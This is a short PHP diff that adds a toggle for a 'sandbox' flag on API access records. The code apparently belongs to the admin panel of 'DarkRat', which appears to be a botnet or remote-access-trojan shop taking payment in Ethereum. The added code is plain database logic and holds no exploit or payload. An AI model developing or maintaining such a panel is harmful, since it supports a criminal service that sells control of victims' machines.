@@ -119,6 +119,22 @@ SUM(CASE When botshop_orders.payed=1 AND botshop_orders.type = 'eth'  Then botsh
         if(empty($_SESSION["darkrat_userid"])) {
             die("Login Required");
         }
+
+        if(!empty($_POST["changesandbox"])){
+
+            $statement = $GLOBALS["pdo"]->prepare("SELECT * FROM botshop_access WHERE id = ?");
+            $statement->execute(array($id));
+            $apidetails = $statement->fetch();
+            if($apidetails["sandbox"] == 0){
+                $statement = $GLOBALS["pdo"]->prepare("UPDATE botshop_access SET sandbox = ? WHERE id = ?");
+                $statement->execute(array(1, $id));
+            }else{
+                $statement = $GLOBALS["pdo"]->prepare("UPDATE botshop_access SET sandbox = ? WHERE id = ?");
+                $statement->execute(array(0, $id));
+            }
+
+        }
+
         $GLOBALS["template"][1] = "editapi";
         $statement = $GLOBALS["pdo"]->prepare("SELECT * FROM botshop_access WHERE id = ?");
         $statement->execute(array($id));
